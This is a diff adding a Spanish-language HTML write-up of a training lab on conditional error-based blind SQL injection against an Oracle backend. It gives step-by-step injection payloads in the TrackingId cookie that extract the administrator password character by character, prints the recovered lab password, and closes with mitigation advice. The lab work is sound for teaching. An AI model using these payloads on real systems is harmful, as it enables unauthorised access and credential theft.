@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+<meta charset="UTF-8">
+<title>Lab 12 - Conditional Error-Based Blind SQL Injection</title>
+
+<link rel="stylesheet" href="../style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+
+</head>
+
+<body>
+
+<nav class="navbar">
+<div class="nav-content">
+<div class="logo">AG<span>.</span></div>
+
+<div class="links">
+<a href="../index.html">Inicio</a>
+<a href="../roadmap/sql-injection.html">Volver a Labs</a>
+</div>
+</div>
+</nav>
+
+
+<section class="activities-section">
+
+<div class="activities-container">
+
+<div class="activities-header">
+<h2><i class="fas fa-database"></i> Lab 12</h2>
+<p>Conditional Error-based Blind SQL Injection</p>
+</div>
+
+
+<div class="info-card">
+
+<h3><i class="fas fa-layer-group"></i> Información del laboratorio</h3>
+
+<p><strong>Nivel:</strong> Practitioner</p>
+
+<p><strong>Tipo de SQLi:</strong> Conditional Error-based Blind SQL Injection</p>
+
+</div>
+
+
+<div class="info-card">
+
+<h3><i class="fas fa-bullseye"></i> Objetivo</h3>
+
+<p>
+Explotar una vulnerabilidad SQL Injection ciega para enumerar la contraseña del usuario
+<strong>administrator</strong>.
+</p>
+
+<p>
+La aplicación no devuelve resultados de la base de datos, pero sí genera
+errores del servidor cuando una consulta SQL produce una excepción.
+</p>
+
+<p>
+Mediante errores condicionados es posible inferir información del sistema
+y reconstruir la contraseña carácter por carácter.
+</p>
+
+</div>
+
+
+<div class="info-card">
+
+<h3><i class="fas fa-exclamation-triangle"></i> Vulnerabilidad</h3>
+
+<p>
+El servidor concatena directamente el valor de la cookie
+<strong>TrackingId</strong> dentro de una consulta SQL.
+</p>
+
+<p>
+Aunque la aplicación no devuelve datos ni cambia el contenido de la página,
+sí devuelve un error <strong>HTTP 500</strong> cuando ocurre un fallo en la base de datos.
+</p>
+
+<p>
+Esto permite explotar la vulnerabilidad mediante preguntas condicionales que
+provocan errores deliberados.
+</p>
+
+</div>
+
+
+<div class="info-card">
+
+<h3><i class="fas fa-terminal"></i> Procedimiento</h3>
+
+<p><strong>Paso 1 – Detectar SQL Injection</strong></p>
+
+<p>
+Se interceptó una solicitud HTTP en Burp Suite y se modificó la cookie:
+</p>
+
+<pre>
+TrackingId=abc'
+</pre>
+
+<p>
+El servidor devolvió un error SQL, confirmando la vulnerabilidad.
+</p>
+
+
+<p><strong>Paso 2 – Identificar el DBMS</strong></p>
+
+<p>
+Se probó la consulta:
+</p>
+
+<pre>
+TrackingId=abc'||(SELECT '' FROM dual)||'
+</pre>
+
+<p>
+La ausencia de error confirmó que la base de datos utilizada era
+<strong>Oracle</strong>.
+</p>
+
+
+<p><strong>Paso 3 – Probar condiciones booleanas mediante errores</strong></p>
+
+<pre>
+TrackingId=abc'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+</pre>
+
+<p>
+Cuando la condición es verdadera, el servidor devuelve
+<strong>HTTP 500</strong>.
+</p>
+
+
+<p><strong>Paso 4 – Confirmar existencia del usuario administrator</strong></p>
+
+<pre>
+TrackingId=abc'||(
+SELECT CASE WHEN (1=1)
+THEN TO_CHAR(1/0)
+ELSE '' END
+FROM users WHERE username='administrator')||'
+</pre>
+
+<p>
+El error confirma que el usuario existe.
+</p>
+
+
+<p><strong>Paso 5 – Determinar longitud de la contraseña</strong></p>
+
+<pre>
+TrackingId=abc'||(
+SELECT CASE WHEN LENGTH(password)=20
+THEN TO_CHAR(1/0)
+ELSE '' END
+FROM users WHERE username='administrator')||'
+</pre>
+
+<p>
+Se descubrió que la contraseña tiene
+<strong>20 caracteres</strong>.
+</p>
+
+
+<p><strong>Paso 6 – Extraer la contraseña</strong></p>
+
+<p>
+Se utilizó Intruder para probar cada carácter de la contraseña:
+</p>
+
+<pre>
+SUBSTR(password,1,1)
+</pre>
+
+<p>
+Repitiendo el proceso para cada posición se reconstruyó la contraseña completa:
+</p>
+
+<pre>
+0xkkbi6793o8z2ep4map
+</pre>
+
+</div>
+
+
+<div class="info-card">
+
+<h3><i class="fas fa-shield-alt"></i> Mitigación recomendada</h3>
+
+<ul>
+
+<li>Uso obligatorio de consultas parametrizadas.</li>
+
+<li>No concatenar entradas del usuario en consultas SQL.</li>
+
+<li>Ocultar errores de base de datos en producción.</li>
+
+<li>Aplicar principio de mínimo privilegio en la base de datos.</li>
+
+<li>Implementar monitoreo de ataques automatizados.</li>
+
+</ul>
+
+</div>
+
+
+<a href="../roadmap/sql-injection.html" class="back-btn">
+<i class="fas fa-arrow-left"></i> Volver a laboratorios
+</a>
+
+
+</div>
+
+</section>
+
+</body>
+</html>
